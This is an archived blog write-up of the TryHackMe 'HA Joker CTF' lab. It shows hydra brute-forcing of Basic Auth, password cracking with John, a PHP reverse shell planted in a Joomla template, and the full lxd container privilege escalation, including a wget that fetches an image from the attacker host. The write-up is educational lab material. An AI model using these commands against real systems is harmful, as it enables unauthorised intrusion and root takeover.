---
layout: post
title: Archive - CTF Writeup - HA Joker CTF {THM}
description: An archive of an old writeup I wrote about the THM room "HA Joker CTF"
summary: A writeup of the THM room "HA Joker CTF"
tags: archive ctf writeup
minute: 8
---
<br/>

> {{ page.description }}

<br/>

# Introduction

Thank you to [TryHackMe](https://tryhackme.com) for hosting [HA Joker CTF](https://tryhackme.com/room/jokerctf) and thank you to you for giving this writeup a chance, I appreciate you. This is my first box writeup, it was a lot of fun to do and I hope to create more in the future. I am always looking to improve my content so if you have any criticism, positive or negative, please feel free to tweet at me at [@OrielOrielOriel](https://twitter.com/OrielOrielOriel).
<br/>
<br/>

# Enumeration

As always, real hackers hack time, and as I value my time when doing CTFs I like to start with Rustscan. The following command `rustscan -r 1-65535 10.10.239.128 -u 5000 -- -oN scans/nmap.txt -A` blasts all TCP ports on the target machine to quickly determine which ports are open, then automatically performs an nmap scan with the options `-oN scans/nmap.txt -A`. The resulting nmap command yielded the following output, which I have trimmed to its relevant parts: 
<br/>

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
| ssh-rsa AAAAB3NzaC1y<--Snipped!-->3yM5CxAQdqRKgFF
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE<--Snipped!-->EDFIzfQ=
|   256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1<--Snipped!-->sv4RJMvN4B3r
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker
8080/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
```

We can observe that three ports are open, an SSH server on port 22 and two web servers on ports 80 and 8080. At this point in a CTF, my assumption would be that I'd need to chain exploits on the web servers to gain access via SSH. 

As it turns out, that assumption was incorrect. Nevertheless, my methodology in this situation remains the same. I use my browser to navigate to the default web server, located on port 80, and am greeted with the following Joker image:

![Port 80 Web Server Home Page](/assets/media/joker/Port_80_Home.png)

It's not much, and scrolling down only gives a gallery of posters with quotes from Batman movies. I check the source code, but I find nothing of importance to the completion of the CTF. 

At this point I want to check out the other web server. But as I've said before, time management is important, so I run `dirsearch -u 10.10.239.128 -E -w /opt/wordlists/dir-and-file-names.txt -t 15 --plain-text-report scans/dirsearch_80.txt` to 
bruteforce through potential directories on this web server while I check out the web server on port 8080. I navigate to the site using my browser and am greeted with the following screen:

![HTTP Basic Auth Login Screen on Port 8080](/assets/media/joker/Port_8080_Login.png)

It's an HTTP Basic Authentication login prompt, which, unless I want to try some funny business, means I'm going to need to proccur a username and password to access the rest of the web server. This being a Joker/Batman themed box, I have my suspicions about what the username may be. But, since my dirsearch scan is wrapping up, I decide to wait and see if it returns any useful directories. 

My dirsearch scan wraps up with the following output:
<br/>

```
<--Snipped!-->

200     1KB  http://10.10.33.184:80/css/
403   277B   http://10.10.33.184:80/icons/
200     4KB  http://10.10.33.184:80/img/
200     6KB  http://10.10.33.184:80/index.html
200    94KB  http://10.10.33.184:80/phpinfo.php
200    94KB  http://10.10.33.184:80/phpinfo.php/
200   320B   http://10.10.33.184:80/secret.txt
403   277B   http://10.10.33.184:80/server-status/
```

After navigating to the `/secret.txt` path, I find the following snippet of what seems to be an altercation between Batman and Joker. 

![Conversation Between Batman and Joker](/assets/media/joker/Secret_txt.png)

Well, that doesn't exactly provide any additional information. With that said, since I was was already assuming that the login credentials would be Batman/Joker related, I choose to go ahead with an HTTP Basic Authentication bruteforce using the username `joker`. Here is the command I used: `hydra -l joker -P /opt/wordlists/rockyou.txt 10.10.239.128 http-get -s 8080 -v`, and the resulting output:

![Hydra Command and Output](/assets/media/joker/Hydra.png)

I authenticate using those credentials and am greeted by a basic Joomla blog. 

![Joomla Blog](/assets/media/joker/Port_8080_Home.png)

Splitting a CTF into Enumeration, User, and Root, is useful as an organizational tool. With that said, CTFs, or even real-world scenarios like penetration tests and red team engagements, cannot be adequately divided in such a way. And that is particularly the case because of the enumeration section. Simply put, we are constantly enumerating. With every new asset that is discovered, new foothold obtained, or new privilege gained, we enumerate again. Security engagements are a cyclical process of re-enumeration. 

So although the enumeration truly never ends, I think this is a good point to segue into the next section. A `user` shell is near.
<br/>
<br/>

# User

My first instinct when greeted with the login form is to try the same credentials which I used to pass through the HTTP Basic Authentication. I try that combination of `joker:<--Censored!-->` but no dice, the creds don't work. 

I decide to launch another directory bruteforce, but on this webserver instead. Here is the command: `gobuster -u 10.10.239.128:8080 -w opt/wordlists/dirbuster/directory-list-2.3-small.txt -x .txt,.zip,.html,.php -t 15 -o scans/gobuster_8080.txt -U joker -P <--Censored!-->`. I chose not to use dirsearch this time because it doesn't support HTTP Basic Authentication, I'll probably fork it and add that functionality in the future. 

The interesting things found by the scan are an administrator login portal `/administrator` but also what seems to be a backup file at `/backup.zip`. I quickly try the credentials again in the administrator login, but as expected that does not work, then I navigate to the backup file and it triggers a download. 

![Download From /Backup.zip](/assets/media/joker/Backup.png)

I save the file and attempt to unzip it using the `unzip` command, but I receive a prompt asking me for a password. As should be your first instinct in this situation, I check for password reuse and ta-dah! It accepts the password `<--Censored!-->` and I am able to unzip the file and view its contents. 

But what could I have done had the Joker not reused their password? In CTF situations where I want to unlock a .zip file without knowing the password, one of the first things I try is a combination of Zip2John and JohnTheRipper. For those unaware, JohnTheRipper is far more than Hashcat's slower little brother. It in fact comes with a suite of programs which are built to extract hashes from various file types, to then be cracked by the John password cracking tool.

So after using this command `zip2john loot/backup.zip > loot/zip_hash.txt` to extract a hash from the backup.zip file, I then use John to crack that hash and find the password.

![Using John to Crack a Hash](/assets/media/joker/John_Zip_Hash.png)

After unzipping the `backup.zip` file we are provided two directories:

![My Loot Directory: Contains backup.zip, db, site, zip_hash.txt](/assets/media/joker/Loot.png)

In this case the information we need is located in the `db` directory. If you didn't know, most modern websites utilize databases to store a lot of data about the site, including hashed passwords. I decide to use this command `grep db/ -r admin` to dig out all the lines with the word "admin" in every file in the `db` directory. As we can see from the following image, the admin's password hash has been found. 

![Grep of db Directory](/assets/media/joker/Grep_For_Admin.png)

I toss John at that hash and it cracks within a few seconds:

![Using John to Crack the Joomla Hash](/assets/media/joker/John_Admin_Hash.png)

Looks like our username and password combination is `admin:<--Censored!-->`. I test that login information at the admin portal and successfully authenticate into the administrator control panel. 

![Joomla Administrator Control Panel](/assets/media/joker/Joomla_Admin_Panel.png)

With the ability to edit pages and plugins on a website, one can usually gain remote code execution. I navigate to the templates page, then edit the `error.php` page with a Linux PHP reverse shell. When I navigate to a page that does not exist, the website will load the `error.php` page and launch a reverse shell to my Netcat listener. I would paste the Linux PHP Reverse Shell here but it's really rather large so instead you click [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to be taken to a github where it is hosted.

I set up a Netcat listener then attempt to navigate to a page that does not exist, to trigger the reverse shell. As you can see from the following screenshot, I try to go the page `index.php/henwo`. 

![Navigating to /index.php/henwo](/assets/media/joker/Henwo.png)

![Catching the Reverse Shell With Netcat](/assets/media/joker/User_Shell.png)

And ta-dah! The reverse shell is caught by my Netcat listener and we have a user shell as www-data. In the next section I will demonstrate how to upgrade this reverse shell to allow for `backspace`, `clear`, and `ctrl+c` functionality and then escalate my privileges to root. If you are observant, you can actually glean, from this screenshot alone, a key piece of information that hints at how to gain root privileges. 
<br/>
<br/>

# Root

To upgrade our reverse shell to have `clear`, `backspace`, and `ctrl+c` functionality, I first try to find out if a version of Python is available to this user. I use the command `which` against both "python" and "python3" to find that Python3 is available. I then use the command `python3 -c "import pty;pty.spawn('/bin/bash')"` which is a Python3 one-liner to import the pty module, then spawn a Python3 based pty session using the binary located at /bin/bash. This should allow us to backspace and use arrow keys to move our cursor around. 

After this I do `export TERM=xterm` to allow us to clear the screen. The final command to upgrade this shell is the easiest to mess up, as such, please use the following .gif for clarification. 

I use the key combination `ctrl+z` to background the Netcat process, returning me to my local terminal. Then, I type `stty raw -echo` and hit enter. Now, I type `fg` and hit enter. *Notice that the text* `fg` *does not show up, this is because of the previous command which affects how our keyboard input is received by the hardware.* I then type in `reset`, hit enter, and we have a fully functioning shell on the victim machine which does not stop when we hit `ctrl+c`. 

![Gif Showcasing the Shell Upgrade](/assets/media/joker/Full_Shell_Demo.gif)

Now, onto privilege escalation!

Usually, this moment in a CTF would have me enumerating by using automated tools such as linPEAS and looking around the box to find anything out of the ordinary. However, as you may have seen from when we got the intial shell, we know that our user `www-data` is part of the `lxd` group. The lxd group is a group that typically allows a user to use LXD, which is a Linux container manager. By the nature of containers, they are usually required to be run by a highly privileged daemon. Since we are part of the lxd group, I suspect that we will be able to use `lxc` to interface with the LXD daemon and escalate our privileges. 

Since we're dealing with containers, we're likely to need a container image. You can find a compileable version of Alpine for Linux at [this](https://github.com/saghul/lxd-alpine-builder) Github page. Just clone the Github page and run `./build-alpine` and it will generate an Alpine image for you.

I start by switching to the directory `/dev/shm`. This is a directory that is highly likely to be writeable by even low privileged users. Then, I launch local HTTP server and use `wget` to download my Alpine image. My HTTP server of choice is called Updog. It can be installed with `pip3 install updog`. 
<br/>

```
www-data@ubuntu:/$ cd /dev/shm
cd /dev/shm
www-data@ubuntu:/dev/shm$ wget 10.13.1.225:9090/alpine-v3.12-x86_64-20200929_2146.tar.gz

--2020-10-02 13:55:51--  http://10.13.1.225:9090/alpine-v3.12-x86_64-20200929_2146.tar.gz
Connecting to 10.13.1.225:9090... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3194888 (3.0M) [application/x-tar]
Saving to: 'alpine-v3.12-x86_64-20200929_2146.tar.gz'

alpine-v3.12-x86_64 100%[===================>]   3.05M   704KB/s    in 8.9s    

2020-10-02 13:56:01 (351 KB/s) - 'alpine-v3.12-x86_64-20200929_2146.tar.gz' saved [3194888/3194888]
```

With the Alpine image now downloaded to the victim machine, I can begin the privilege escalation process. I start by importing the image with the alias "privesc" by using this command: `lxc image import ./alpine-v3.12-x86_64-20200929_2146.tar.gz --alias privesc`. I proceed by using `lxc image list` to confirm that the import has been successfull, then I use `lxc init privesc joker -c security.privileged=true` to initialize the container with the name "joker." The `security.privileged` flag gives this container the privilege to access all the files we ask it to.

After that, I use the command `lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true` to add a disk to the container whose source is `/`, whose mount path is `/mnt/root`, and with the recursive flag set to `true`. In other words, this container will contain all files on the system.
<br/>

```
www-data@ubuntu:/dev/shm$ lxc image import ./alpine-v3.12-x86_64-20200929_2146.tar.gz --alias privesc      
<ine-v3.12-x86_64-20200929_2146.tar.gz --alias joker
www-data@ubuntu:/dev/shm$ 
www-data@ubuntu:/dev/shm$ lxc image list
<--Snipped!-->
www-data@ubuntu:/dev/shm$ lxc init privesc joker -c security.privileged=true
Creating joker
www-data@ubuntu:/dev/shm$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true                         
Device mydevice added to joker
```

All that's left to do is to start the container with `lxc start joker` and then use `lxc exec joker /bin/sh` to execute `/bin/sh` within the container, thus giving ourselves a shell within that container. Since the container's `security.privileged` flag is set to `true`, we are granted a root shell within the container, a container which now has access to every single file in the system. 
<br/>

```
www-data@ubuntu:/dev/shm$ lxc start joker
www-data@ubuntu:/dev/shm$ lxc exec joker /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # 
```
<br/>
<br/>

# Tools Mentioned 
<br/>
 : [dirsearch](https://github.com/maurosoria/dirsearch)
 : [gobuster](https://github.com/OJ/gobuster)
 : [Hydra](https://github.com/vanhauser-thc/thc-hydra)
 : [JohnTheRipper](https://github.com/openwall/john)
 : [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 : [linux-php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 : [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder)
 : [updog](https://github.com/sc0tfree/updog)
 : [RustScan](https://github.com/RustScan/RustScan)
 : [nmap](https://github.com/nmap/nmap)
